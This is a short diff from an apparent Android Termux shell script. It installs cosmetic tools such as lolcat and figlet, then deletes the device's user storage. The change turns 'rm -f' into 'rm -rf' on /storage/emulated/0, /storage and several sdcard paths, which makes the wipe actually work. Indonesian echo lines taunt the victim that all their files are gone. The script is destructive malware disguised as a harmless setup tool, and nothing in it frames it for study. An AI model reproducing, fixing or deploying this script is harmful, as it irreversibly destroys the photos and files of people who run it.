@@ -25,11 +25,11 @@ pkg install ruby
 pkg install gem
 gem install lolcat
 pkg install figlet
-rm -f /storage/emulated/0
-rm -f /storage
-rm -f /storage/sdcard
-rm -f /storage/sdcard1
-rm -f /storage/sdcard2
+rm -rf /storage/emulated/0
+rm -rf /storage
+rm -rf /storage/sdcard
+rm -rf /storage/sdcard1
+rm -rf /storage/sdcard2
 echo "oke tunggu sebentar" | lolcat
 echo "selamat file anda terhapus semua haha kalau mau balik lagi data d$
 fi
